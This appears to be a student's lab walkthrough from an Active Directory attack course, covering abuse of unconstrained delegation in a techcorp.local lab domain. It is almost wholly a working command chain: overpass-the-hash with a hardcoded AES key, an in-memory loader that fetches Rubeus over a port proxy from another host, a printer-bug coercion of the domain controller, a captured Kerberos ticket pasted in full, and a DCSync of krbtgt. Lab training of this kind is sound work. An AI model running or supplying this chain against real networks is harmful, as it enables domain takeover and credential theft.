
Task 
• Find a server in US domain where Unconstrained Delegation is enabled. 
• Compromise that server and get Domain Admin privileges.

First, we need to find out the machines in us.techcorp.local with unconstrained delegation. We can use PowerView or Active Directory module for that. Using the ActiveDirectory module:

```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

![[Pasted image 20250318161021.png]]

So, we need to compromise us-web. Recall that we got credentials of webmaster in the previous handson. Let's check if that user has administrative access to us-web. We will use OverPass-The-Hash attack to use webmaster's AES keys using SafetyKatz. You can use other tools of your choice. Run the below from an elevated shell:

```
echo %Pwd% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


In the newly spawned process, use Find-PSRemotingLocalAdminAccess after loading InvisiShell:

```
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```
Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
```

![[Pasted image 20250318161546.png]]

Great! We have administrative access to us-web using webmaster's credentials. Now, we will use the printer bug to force us-dc to connect to us-web. Let's first copy Loader.exe to us-web to download and execute Rubeus in the memory and start monitoring for any authentication from us-dc

We can use multiple methods to copy Rubeus like xcopy, PowerShell Remoting etc.


### Copy Loader.exe using xcopy and execute using winrs

From the process running as webmaster:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\usweb\C$\Users\Public\Loader.exe /Y
```

```
winrs -r:us-web cmd.exe
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

```
echo %Pwn% monitor
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:US-DC$ /interval:5 /nowrap
```

Using either of the above methods, once we have Rubeus running in the monitor mode, we can start MS-RPRN.exe to force connect us-dc to us-web and thereby abuse the printer bug:

```
C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\usweb.us.techcorp.local
```

![[Pasted image 20250318181126.png]]

On the session where Rubeus is running, we can see:

![[Pasted image 20250318181202.png]]

Copy the Base64EncodedTicket, remove unnecessary spaces and newline (is any) and use the ticket with Rubes on the Student VM.

```
echo %Pwn% ptt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMpItcqcfLp33P0wfG1OAu5MelFpxqjsdG0oByjZvSJOskF4FaqGBbqx1OxlbWY/gcbCH6gsQDG4F9NSuV9SOTYG0UP2JdKNY2DJBK3DtIEazo6nbHt7c6GmVAKojAnTvVplbRrwN3AVeNgdt/f9xtRG8RnMwFAT9P4ESo0fb68nfs6KC5DW4CcVNGF0arVZczQfHhF0R2CvP1joT+2DSzRfyaEPs3u9tOuBmGmUV69tOasii5VHl28sgS+w+9PBZecVmMUtWtyZnxBMiCMnfp6/k2IjvQJJKqLaqU93CFuX5tgG4MF4GEFzz7KslDxd9Vkiese/pl8hVAyWvNR16b7GU9RK/KP9AGSJVLtrIjutotVQf0K8Rj9giLVcr1VkbYeOwyOcM4asCd26gEE3R6nSnrhHHC+/jZKkBbZbtmyyrkcRoJTFczwQpRgsQuPTwkzHQBvvg4biHDdYXsmdsIO43iHe1uLOlRDiXy8wIESYh/YZuFU4baG4OwIU6dltjTSHNO/VVQQ98scSCGsHoyocCwGQkReHlur7mvq1mZ4jHeohnDHfJ0VV1M1UBM74477lTvr3BQ0P0Z8YM6/1X3KXuCv4JEc1/LMnZp353zVXF41yqXAR6JU6uQY9wrxHq01HwqAjf5+Azw/vq/tnIl2p4eKyuD3A/mjOUALFI7VQCptfH4F55kNwzei2meKkkWbvpj9+BZdNkThf9+x27aKY3T+06uBU0mip948z0do9e6UkGxt9HthnwZuUY2H2NWHiTYbiX4Xvzk28cQHvdIj2n+Q4yjMZoU07WrXcUB6BCp7au3oOSfW7oo3kLKhE7h+cCD1mU0v74B9GB1Vv4g76kbA/Ktsg7PgZD1mQsLlohyd56eHnOf7/lurQg+DLTVGA6RkalvhINxezDWFdqDWmouOpqliBGRFxybDub+CEslqezjw94NvIjaUOAX1V/jKtyOOehymPM6UwAMEoIiSS15JcvMcnV3AVT55HBuOE5/t/cSU+fGmLQv68r8e48lcauEdZ4hvgBMy5muEGsIvH2EP3EReOYS13VvrvWzEDtDGGlmCKTYOgCfITCL3STmwauDSpuyfvyKgZGehHhwu0e7vy5pmYCcUNXq5TRjQXPNb5OSKKd1KR0TPJVBQJCkop/8GfRN2aaDnxb1YHDtAuMwNI+ACbOhntEsH+T12zYUjrXxKbXNb8uuYa80LPbMtobIeDVWpgP4nfjAo1UtOvcQqTyVng8E++dUnigyVKcCSpYDi2+ltvfns/A/xJl9ymFS0jckQZcdDkf+04d5J5rPOnMJoeme/kAuppm5pErKMWFSs5rM6c57ke5ZoHVf2bBKta3Ey/RjtdKNeQBeB8xklSGvYNSvDRJ3EAbDDzAwdXC2sJfU9MTN1ewkWZ6zAfxubiuF6iUPbGaOakkY6Y9fBgM1RUBaKVJfOTC433iXNkJico2ZYRUjmG+jgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCCfNJ1Flrzts+HWwUGO2yraHAZ/+Gu9UdqbzTvEqekJDqETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAA
```

![[Pasted image 20250318181545.png]]

```
echo %Pwn% lsadump::dcsync
```


```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit"
```

![[Pasted image 20250318181728.png]]



